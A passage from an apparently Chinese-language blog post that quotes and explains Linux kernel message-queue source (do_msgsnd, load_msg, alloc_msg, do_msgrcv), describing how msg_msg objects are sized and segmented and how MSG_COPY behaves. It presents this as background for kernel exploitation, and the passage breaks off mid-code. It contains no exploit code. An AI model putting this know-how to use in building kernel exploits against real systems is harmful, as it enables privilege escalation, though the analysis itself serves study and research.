<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">long</span> mtype, <span class="keyword">void</span> __user *mtext,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> msgsz, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="keyword">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	msg = load_msg(mtext, msgsz);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msg))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line"></span><br><span class="line">	msg-&gt;m_type = mtype;</span><br><span class="line">	msg-&gt;m_ts = msgsz;</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	msq = msq_obtain_object_check(ns, msqid);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msq)) &#123;</span><br><span class="line">		err = PTR_ERR(msq);</span><br><span class="line">		<span class="keyword">goto</span> out_unlock1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_sender</span> <span class="title">s</span>;</span></span><br><span class="line"></span><br><span class="line">		err = -EACCES;</span><br><span class="line">		<span class="keyword">if</span> (ipcperms(ns, &amp;msq-&gt;q_perm, S_IWUGO))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		err = security_msg_queue_msgsnd(&amp;msq-&gt;q_perm, msg, msgflg);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (msg_fits_inqueue(msq, msgsz))</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* queue full, wait: */</span></span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; IPC_NOWAIT) &#123;</span><br><span class="line">			err = -EAGAIN;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* enqueue the sender and prepare to block */</span></span><br><span class="line">		ss_add(msq, &amp;s, msgsz);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!ipc_rcu_getref(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		schedule();</span><br><span class="line"></span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			err = -EIDRM;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line">		ss_del(&amp;s);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">			err = -ERESTARTNOHAND;</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ipc_update_pid(&amp;msq-&gt;q_lspid, task_tgid(current));</span><br><span class="line">	msq-&gt;q_stime = ktime_get_real_seconds();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pipelined_send(msq, msg, &amp;wake_q)) &#123;</span><br><span class="line">		<span class="comment">/* no one is waiting for this message, enqueue it */</span></span><br><span class="line">		list_add_tail(&amp;msg-&gt;m_list, &amp;msq-&gt;q_messages);</span><br><span class="line">		msq-&gt;q_cbytes += msgsz;</span><br><span class="line">		msq-&gt;q_qnum++;</span><br><span class="line">		atomic_add(msgsz, &amp;ns-&gt;msg_bytes);</span><br><span class="line">		atomic_inc(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = <span class="number">0</span>;</span><br><span class="line">	msg = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">if</span> (msg != <span class="literal">NULL</span>)</span><br><span class="line">		free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数首先对msgtype和msgsz进行了检查，然后调用<code>load_msg(mtext, msgsz)</code>来初始化<code>msg_msg</code>结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数会先调用<code>alloc_msg</code>来请求msg_msg结构体所需要的空间.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	len -= alen;</span><br><span class="line">	pseg = &amp;msg-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">		<span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		*pseg = seg;</span><br><span class="line">		seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		pseg = &amp;seg-&gt;next;</span><br><span class="line">		len -= alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这个函数可以看出msg结构体是可以扩充的，可以从<code>0x40</code>扩充到<code>0x1000</code>,这也是为什么msg_msg利用的范围这么广了。</p>
<p>而且当消息长度超过了<code>0x1000-0x30</code>还可以吧消息进行分段，最多分三段，结构图如下，所以一个消息的长度理论上最多是<code>0x3000-0x30-0x8-0x8</code></p>
<p><img src="https://img-blog.csdnimg.cn/3fcc181ebcc04b70b425a27f57ac166b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYnJlZXplT19v,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<p>函数申请完所有空间就返回到<code>load_msg</code>函数。</p>
<p>然后<code>load_msg</code>把用户空间的消息全部复制到刚申请的msg_msg和msg_msgseg上，就返回到<code>do_msgsnd</code>函数中，这个函数剩下的工作就是经过一堆检查然后把msg_msg链接到对应的消息队列中去，消息队列示意图如下。</p>
<p><img src="https://img-blog.csdnimg.cn/41f3e8fb8b054310ac6d3b18f6b13a4d.png#pic_center" alt="在这里插入图片描述"></p>
<h4 id="msgrcv"><a href="#msgrcv" class="headerlink" title="msgrcv()"></a>msgrcv()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg)</span></span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参数msqid：指定消息队列id，由msgget 返回。<br>参数msgp：接收消息用的结构体指针<br>参数msgsz：接收消息用的结构体大小<br>参数msgtyp：三种情况：<br>=0 : 读取消息队列中第一个消息</p>
<p>0 : 读取消息队列中类型为msgtyp 的第一个消息，如果msgflg 设置了MSG_EXCEPT 则会读取非msgtyp类型的第一个消息， 这个消息类型在msgsnd 里用msgbuf 结构体指定的；如果msgflg 设置了MSG_COPY则会读取队列中的第msgtyp个消息。<br>&lt;0 : 读取消息队列中最小类型且小于等于msgtyp 绝对值的消息。<br>参数msgflg：通常使用下面的一些flag：<br>IPC_NOWAIT : 消息队列为空则不会阻塞。<br>MSG_EXCEPT : 跟上面msgtyp 联用，读取类型不是msgtyp 的第一条消息。<br>MSG_NOERROR : 消息长度超过msgsz 时截断消息。<br>MSG_COPY : 漏洞利用中会用到，内核会把消息队列中的消息拷贝一份返回用户空间而不会释放该条消息结构。<br>返回值：成功时返回读取的消息字节数，失败返回-1。</p>
</blockquote>
<p>内核会调用<code>do_msgrcv()</code>函数,这个函数就会根据msgtype和msgflg来搜索到msg,然后把这个msg拷贝到用户空间的<code>buf</code>处，当msgflg!=<code>MSG_COPY</code>的时候 ，找到msg后就会把这个msg从消息队列中unlink,然后把信息复制给用户空间，然后再free这个<code>msg</code>。</p>
<p>但是当msgflg=<code>MSG_COPY</code>的时候，会先申请一个新的msg,然后在消息队列中找到一个msg,然后把这个msg拷贝到新的msg中。然后再把新的msg的内容拷贝到用户态，最后释放新的<code>msg</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">	       <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> mode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">	&#125;</span><br><span class="line">	mode = convert_mode(&amp;msgtyp, msgflg);</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	msq = msq_obtain_object_check(ns, msqid);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(msq)) &#123;</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		free_copy(copy);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(msq);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">msg_receiver</span> <span class="title">msr_d</span>;</span></span><br><span class="line"></span><br><span class="line">		msg = ERR_PTR(-EACCES);</span><br><span class="line">		<span class="keyword">if</span> (ipcperms(ns, &amp;msq-&gt;q_perm, S_IRUGO))</span><br><span class="line">			<span class="keyword">goto</span> out_unlock1;</span><br><span class="line"></span><br><span class="line">		ipc_lock_object(&amp;msq-&gt;q_perm);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* raced with RMID? */</span></span><br><span class="line">		<span class="keyword">if</span> (!ipc_valid_object(&amp;msq-&gt;q_perm)) &#123;</span><br><span class="line">			msg = ERR_PTR(-EIDRM);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		msg = find_msg(msq, &amp;msgtyp, mode);</span><br><span class="line">		<span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">				msg = ERR_PTR(-E2BIG);</span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">				msg = copy_msg(msg, copy);</span><br><span class="line">				<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			list_del(&amp;msg-&gt;m_list);</span><br><span class="line">			msq-&gt;q_qnum--;</span><br><span class="line">			msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">			ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">			msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">			atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">			atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">			ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* No message waiting. Wait for a message */</span></span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; IPC_NOWAIT) &#123;</span><br><span class="line">			msg = ERR_PTR(-ENOMSG);</span><br><span class="line">			<span class="keyword">goto</span> out_unlock0;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		list_add_tail(&amp;msr_d.r_list, &amp;msq-&gt;q_receivers);</span><br><span class="line">		msr_d.r_tsk = current;</span><br><span class="line">		msr_d.r_msgtype = msgtyp;</span><br><span class="line">		msr_d.r_mode = mode;</span><br><span class="line">		<span class="keyword">if</span> (msgflg &amp; MSG_NOERROR)</span><br><span class="line">			msr_d.r_maxsize = INT_MAX;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			msr_d.r_maxsize = bufsz;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* memory barrier not require due to ipc_lock_object() */</span></span><br><span class="line">		WRITE_ONCE(msr_d.r_msg, ERR_PTR(-EAGAIN));</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* memory barrier not required, we own ipc_lock_object() */</span></span><br><span class="line">		__set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line"></span><br><span class="line">		ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		schedule();</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Lockless receive, part 1:</span></span><br><span class="line"><span class="comment">		 * We don&#x27;t hold a reference to the queue and getting a</span></span><br><span class="line"><span class="comment">		 * reference would defeat the idea of a lockless operation,</span></span><br><span class="line"><span class="comment">		 * thus the code relies on rcu to guarantee the existence of</span></span><br><span class="line"><span class="comment">		 * msq:</span></span><br><span class="line"><span class="comment">		 * Prior to destruction, expunge_all(-EIRDM) changes r_msg.</span></span><br><span class="line"><span class="comment">		 * Thus if r_msg is -EAGAIN, then the queue not yet destroyed.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		rcu_read_lock();</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Lockless receive, part 2:</span></span><br><span class="line"><span class="comment">		 * The work in pipelined_send() and expunge_all():</span></span><br><span 